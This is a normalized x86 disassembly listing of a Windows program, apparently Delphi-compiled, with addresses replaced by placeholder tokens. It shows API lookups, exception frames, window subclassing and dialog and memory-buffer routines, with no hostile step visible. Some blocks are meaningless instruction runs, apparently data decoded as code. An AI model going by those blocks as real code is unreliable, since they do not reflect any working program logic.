mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42ec6c
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_42ec94
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ecdc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ece3
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403254
call sub_42e348
cmp [ rw-data ] 0x0
jg r-xdata
sub_42ed04
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ed29
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ed30
retn
sub_42ed3c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ed61
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ed68
retn
sub_42ed74
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ed99
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42eda0
retn
sub_42edac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42edd1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42edd8
retn
sub_42ede4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ee09
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ee10
retn
sub_42ee1c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ee41
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ee48
retn
sub_42ee85
dec [ ebx - 0x1374aa40 ]
xor eax eax
push ebp
push sub_42eead
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42eeb4
retn
sub_42eee8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ef0d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ef14
retn
sub_42ef20
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ef45
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ef4c
retn
sub_42f34e
inc edx
add [ eax + eax - 0x10a80000 ] dh
inc edx
add [ edi + eax ] dh
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add al cl
inc [ edx ]
in al dx
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ ecx + eax - 0x5353ffbd ] dl
inc ecx
add [ ebx + eax - 0x5437ffbd ] dh
inc ecx
add [ esp + eax ] dl
inc edx
add al ah
add al [ edx ]
and al 0x4
inc edx
add [ eax + 0x74c0042 ] bl
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add [ eax ] bl
add [ ebx ] eax
hlt
sub_42fd08
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_468710
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_464cb0
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_464cb0
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_468414
mov edi eax
mov eax ebx
call sub_4683f8
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_4683e0
mov edi eax
mov eax ebx
call sub_46842c
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_42fdbc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_42fd08
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_42fe24
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41ffc4
mov [ esi + 0x30 ] 0x1
push esi
push sub_42ff00
call sub_421054
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_42fe6c
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420010
test bl bl
jle r-xdata
call sub_4210ec
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_42fea0
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_46b1ac
mov cl 0x1
sub_42fec8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4034a4
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42ff00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42ff2a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ff98
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_461a04
mov [ ebp - 0x14 ] eax
call sub_461920
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_43005b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46aa9c
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_43002d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430034
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46aaf8
retn
sub_430034
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430062
mov eax [ ebp - 0x14 ]
call sub_461ab8
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_461928
retn
sub_430094
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x110
jne r-xdata
cmp ebx 0x4e
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x3c ] esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push esi
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
push edi
mov eax [ ebp + 0x10 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
cmp [ edi + 0x8 ] 0xfffffda7
jne r-xdata
push 0xfffffff8
push esi
call GetWindowLongA
call sub_42fd08
sub_430118
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42fe24
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ esi + 0x58 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x5c ] eax
mov al [ r-xdata ]
mov [ esi + 0xb0 ] al
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ esi + 0x7c ] eax
mov [ esi + 0x64 ] 0x1
mov [ esi + 0x80 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_430191
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x7c ]
call sub_403254
mov eax [ esi + 0x58 ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42fe6c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_4301cc
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_430854
mov eax edi
mov si 0xffed
call sub_403450
mov ebx eax
mov eax [ edi + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_4301f4
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx ]
cmp eax 0x110
jne r-xdata
cmp eax 0x4e
jne r-xdata
test [ edi + 0x5e ] 0x1
je r-xdata
mov edx ebx
mov eax edi
call sub_42ff4c
mov esi [ ebx + 0x8 ]
mov eax [ esi + 0x8 ]
add eax 0x260
cmp eax 0x7
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
jmp [ eax * 4 + jump_table_430238 ]
mov edx [ esi + 0xc ]
mov eax edi
call sub_4301cc
test al al
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403450
jmp r-xdata
mov eax edi
mov si 0xffec
call sub_403450
jmp r-xdata
mov eax edi
mov si 0xffeb
call sub_403450
jmp r-xdata
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
cmp eax [ edi + 0x68 ]
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax 0x1
mov [ ebx + 0xc ] eax
push eax
push 0x0
mov eax [ edi + 0x3c ]
push eax
call SetWindowLongA
jmp r-xdata
mov [ edi + 0x68 ] eax
mov eax edi
mov si 0xffea
call sub_403450
jmp r-xdata
mov [ esp ] 0x1
mov ecx esp
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax edi
mov si 0xffe9
call sub_403450
xor eax eax
mov al [ esp ]
mov [ ebx + 0xc ] eax
sub_4302f0
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xa2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
sub_430378
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4303aa
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
xchg edx eax
call sub_41e2a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4303b1
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_4303b4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42033c
push ebx
push sub_430378
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_4303f8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_403fa4
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov ecx r-xdata
mov edx esi
call sub_4042b0
mov eax [ ebx ]
call sub_404464
mov dl 0x7c
call sub_40cad8
test eax eax
je r-xdata
mov [ eax ] 0x0
inc eax
mov dl 0x7c
call sub_40cad8
test eax eax
jne r-xdata
sub_430448
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4306f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebp - 0x68 ]
xor ecx ecx
mov edx 0x58
call sub_402c68
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
mov [ ebp - 0x68 ] 0x4c
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
mov [ ebp - 0x68 ] 0x58
jmp r-xdata
mov [ ebp - 0x48 ] 0x104
mov [ ebp - 0x48 ] 0xffef
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x60 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x60 ]
call sub_4303f8
mov eax [ ebp - 0x8 ]
call sub_404464
mov [ ebp - 0x5c ] eax
mov eax [ ebx + 0x64 ]
mov [ ebp - 0x50 ] eax
mov [ ebx + 0x68 ] eax
test [ ebx + 0x5c ] 0x40
je r-xdata
mov eax [ ebx + 0x6c ]
call sub_404464
mov [ ebp - 0x3c ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp - 0x48 ]
add edx 0x2
lea eax [ ebp - 0xc ]
call sub_4045f0
mov eax [ ebp - 0xc ]
call sub_404464
mov esi eax
mov [ ebp - 0x4c ] esi
mov edx [ ebp - 0x48 ]
add edx 0x2
mov eax esi
xor ecx ecx
call sub_402c68
mov eax [ ebx + 0x78 ]
call sub_404464
mov edx eax
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x4c ]
call sub_408c44
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0x5c ] edx
mov eax r-xdata
mov [ ebp - 0x3c ] eax
jmp r-xdata
inc eax
add esi 0x4
cmp al 0x16
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x34 ] edx
mov eax [ ebx + 0x70 ]
call sub_404464
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x20
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov esi rw-data
mov edx eax
cmp dl 0x1f
ja r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ ebp - 0x34 ] 0xfff7ffff
xor [ ebp - 0x34 ] 0x80000
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
test [ ebp - 0x32 ] 0x8
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ ebx + 0x5e ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_404464
mov [ ebp - 0x2c ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x78 ]
call sub_408abc
lea eax [ ebp - 0x10 ]
mov ecx 0x1
mov edx 0x1
call sub_404504
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x74 ]
call sub_40403c
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
xor eax eax
mov esi rw-data
mov [ ebp - 0x24 ] sub_42fdbc
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0xb0 ] edx
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x24 ] sub_430094
inc eax
add esi 0x4
cmp al 0x1
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x14 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x64 ] eax
lea ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov esi eax
test esi esi
je r-xdata
or [ ebp - 0x34 ] 0x40
mov [ ebp - 0x20 ] eax
mov edx eax
cmp dl 0x7
ja r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430700
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403fc8
retn
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_430854
test [ ebp - 0x33 ] 0x4
je r-xdata
and [ ebx + 0x5c ] 0xffffff7f
or [ ebx + 0x5c ] 0x80
jmp r-xdata
and [ ebx + 0x5c ] 0xfffffffe
or [ ebx + 0x5c ] 0x1
jmp r-xdata
test [ ebp - 0x34 ] 0x1
je r-xdata
mov eax [ ebp - 0x50 ]
mov [ ebx + 0x64 ] eax
sub_43070c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov dl [ eax - 0x1 ]
mov eax esi
call sub_40cad8
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx ebx
sub ecx esi
mov eax edi
mov edx esi
call sub_404094
inc ebx
mov eax edi
mov edx esi
call sub_40419c
mov eax esi
call sub_408bcc
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_430754
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_430839
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43070c
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_43070c
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_408a04
cmp [ eax ] 0x5c
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x5c
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40426c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430840
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_43070c
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404264
cmp eax 0x3
jle r-xdata
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4042b0
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1 ] 0x3a
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2 ] 0x5c
je r-xdata
sub_430854
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4308ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5e ] 0x1
jne r-xdata
push ebp
mov eax [ edx + 0x1c ]
mov edx [ ebp - 0x8 ]
add edx 0x78
call sub_43070c
pop ecx
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x78 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
push ebp
mov eax [ edx + 0x1c ]
call sub_430754
pop ecx
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax 0x78
call sub_403ff8
jmp r-xdata
mov [ ebp - 0x1 ] 0x20
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430906
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
sub_43090c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
push 0x0
push esi
xor ecx ecx
xor edx edx
xor eax eax
call sub_41919c
test [ ebx + 0x5e ] 0x1
jne r-xdata
push esi
push edi
call GetClientRect
jmp r-xdata
push esi
push 0x45f
push edi
call GetDlgItem
push eax
call GetWindowRect
push 0x2
push esi
mov eax [ ebx + 0x3c ]
push eax
push 0x0
call MapWindowPoints
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_430960
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x78 ]
call sub_403ff8
cmp [ ebx + 0x3c ] 0x0
je r-xdata
mov eax esp
push eax
push 0x105
push 0x465
mov eax [ ebx + 0x3c ]
push eax
call GetParent
push eax
call SendMessageA
mov edx esi
mov eax esp
call sub_408dcc
jmp r-xdata
add esp 0x108
pop esi
pop ebx
retn
sub_4309c8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov eax esi
call sub_404264
mov ebx eax
cmp ebx 0x1
jle r-xdata
lea eax [ edi + 0x6c ]
push eax
mov ecx ebx
mov edx 0x1
mov eax esi
call sub_4044c4
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40c8d4
test al al
je r-xdata
mov ecx ebx
dec ecx
mov edx esi
mov eax r-xdata
call sub_40c908
test al al
jne r-xdata
dec ebx
sub_430a6c
push ebp
mov ebp esp
add esp 0xfffff3fc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
lea eax [ ebp - 0xc04 ]
push eax
push ebx
call sub_42de20
lea ecx [ ebp - 0x804 ]
lea edx [ ebp - 0x404 ]
call sub_42d5b4
cmp [ ebx ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x404 ]
call sub_408bb4
mov ebx eax
add ebx 0x8
lea eax [ ebp - 0x804 ]
call sub_408bb4
add ebx eax
lea eax [ ebp - 0xc04 ]
call sub_408bb4
add ebx eax
add ebx 0x3
push ebx
push 0x42
call GlobalAlloc
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call GlobalLock
mov esi eax
xor eax eax
push ebp
push sub_430b60
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx esi
add ebx 0x8
mov edi esi
mov eax ebx
sub ax si
mov [ edi ] ax
lea edx [ ebp - 0x804 ]
mov eax ebx
call sub_408c18
inc eax
mov ebx eax
mov eax ebx
sub ax si
mov [ edi + 0x2 ] ax
lea edx [ ebp - 0x404 ]
mov eax ebx
call sub_408c18
inc eax
mov ebx eax
mov eax ebx
sub ax si
mov [ edi + 0x4 ] ax
lea edx [ ebp - 0xc04 ]
mov eax ebx
call sub_408bf0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call GlobalUnlock
retn
sub_430b70
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov ebx eax
xor eax eax
push ebp
push sub_430bdc
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi ebx
movzx eax [ esi + 0x4 ]
mov edi ebx
add eax edi
push eax
mov eax [ ebp - 0x4 ]
push eax
call sub_42de20
movzx ecx [ esi ]
add ecx edi
movzx edx [ esi + 0x2 ]
add edx edi
call sub_42d65c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430be3
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
mov eax [ ebp - 0x8 ]
push eax
call GlobalFree
retn
sub_430bec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GlobalSize
mov ebx eax
push ebx
push 0x42
call GlobalAlloc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor edx edx
push ebp
push sub_430c6e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
push eax
call GlobalLock
mov esi eax
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GlobalUnlock
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
retn
test eax eax
je r-xdata
mov edx eax
mov eax esi
mov ecx ebx
call sub_4029c0
sub_430c98
push ebx
push esi
push edi
add esp 0xffffffb8
mov edi eax
lea esi [ esp + 0x4 ]
mov eax esi
xor ecx ecx
mov edx 0x42
call sub_402c68
mov [ esi ] 0x42
mov eax [ rw-data ]
mov [ esi + 0x22 ] eax
lea edx [ esi + 0xc ]
